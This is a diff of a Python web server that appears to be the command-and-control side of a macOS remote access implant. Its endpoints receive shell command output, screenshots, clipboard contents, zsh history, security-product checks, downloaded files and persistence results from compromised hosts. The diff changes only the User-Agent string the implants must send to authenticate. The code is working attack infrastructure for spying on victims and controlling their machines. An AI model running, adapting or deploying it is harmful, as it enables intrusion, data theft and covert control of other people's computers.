@@ -26,7 +26,7 @@ async def InitCall(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         peer = request.transport.get_extra_info('peername')
         host, port = peer
         print("\033[92m[+] Initial connection from ([IP],[source_port]): %s\033[0m" % str(peer))
@@ -46,7 +46,7 @@ async def CheckIn(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         peer = request.transport.get_extra_info('peername')
         host, port = peer
         timestmp = datetime.now()
@@ -224,7 +224,7 @@ async def GetScreenshot(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         sdata_init = await request.read()
         timestmp = datetime.now()
         print("Timestamp: %s" % str(timestmp))
@@ -243,7 +243,7 @@ async def GetDownload(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         ddata_init = await request.read()
         ddata1 = urllib.parse.unquote_plus(ddata_init.decode('utf8'))
         if 'content' in ddata1:
@@ -269,7 +269,7 @@ async def GetPath(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         path = await request.read()
         timestmp = datetime.now()
         print("Timestamp: %s" % str(timestmp))
@@ -284,7 +284,7 @@ async def ChangeDir(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         pathinfo = await request.read()
         timestmp = datetime.now()
         print("Timestamp: %s" % str(timestmp))
@@ -299,7 +299,7 @@ async def ListDir(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         listinfo = await request.read()
         listinfo2 = listinfo.decode('utf8').split(',')
         timestmp = datetime.now()
@@ -317,7 +317,7 @@ async def Clipboard(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         clipinfo_init = await request.read()
   
         timestmp = datetime.now()
@@ -338,7 +338,7 @@ async def Prompt(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         promptdata = await request.read()
         promptdata2 = str(promptdata.decode('utf8'))
         
@@ -355,7 +355,7 @@ async def SpawnShell(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         spawndata = await request.read()
         print("Results:")
         print("\033[92m%s\033[0m" % str(spawndata.decode('utf8')))
@@ -369,7 +369,7 @@ async def Addresses(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         addressdata = await request.read()
         print("\033[92m[+] Local IP Address:\033[0m")
         print(str(addressdata.decode('utf8')).replace("('utxt'(","").replace(")",""))
@@ -383,7 +383,7 @@ async def ListUsers(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         userdata = await request.read()
         userdata2 = str(userdata.decode('utf8'))
         userdata3 = userdata2.split(',')
@@ -400,7 +400,7 @@ async def UserHist(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         histdata = await request.read()
         histdata2 = str(histdata.decode('utf8'))
         print("\033[92m[+] zsh History Data:\033[0m[+] \r%s" % str(histdata2))
@@ -414,7 +414,7 @@ async def CheckSecurity(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         secdata = await request.read()
         secdata2 = str(secdata.decode('utf8'))
         print("\033[92m[+] Security product check results:\033[0m")
@@ -429,7 +429,7 @@ async def Whoami(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         wdata = await request.read()
         timestmp = datetime.now()
         print("Timestamp: %s" % str(timestmp))
@@ -445,7 +445,7 @@ async def SysInfo(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         sysinfodata = await request.read()
         timestmp = datetime.now()
         print("Timestamp: %s" % str(timestmp))
@@ -461,7 +461,7 @@ async def CatFile(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         catdata = await request.read()
         catdata2 = urllib.parse.unquote_plus(catdata.decode('utf8'))
         if 'content' in catdata2:
@@ -484,7 +484,7 @@ async def ShellCmd(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         cmddata = await request.read()
         timestmp = datetime.now()
         print("Timestamp: %s" % str(timestmp))
@@ -502,7 +502,7 @@ async def Sleeper(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         sleepdata = await request.read()
         print("[+] %s" % str(sleepdata))
         text = 'OK'
@@ -515,7 +515,7 @@ async def Persist(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         returndata = await request.read()
         timestamp = datetime.now()
         print("Timestamp: %s" % str(timestamp))
@@ -531,7 +531,7 @@ async def UnPersist(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         returndata = await request.read()
         timestamp = datetime.now()
         print("Timestamp: %s" % str(timestamp))
@@ -546,7 +546,7 @@ async def RunJXA(request):
     UAgent = headers.get('User-Agent')
     token = str(headers.get('Authorization'))
     length = len(token)
-    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36") and (length == 266) and (token[:12] == "Bearer valid")):
+    if ((UAgent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36767") and (length == 266) and (token[:12] == "Bearer valid")):
         returndata = await request.read()
         timestamp = datetime.now()
         print("Timestamp: %s" % str(timestamp))
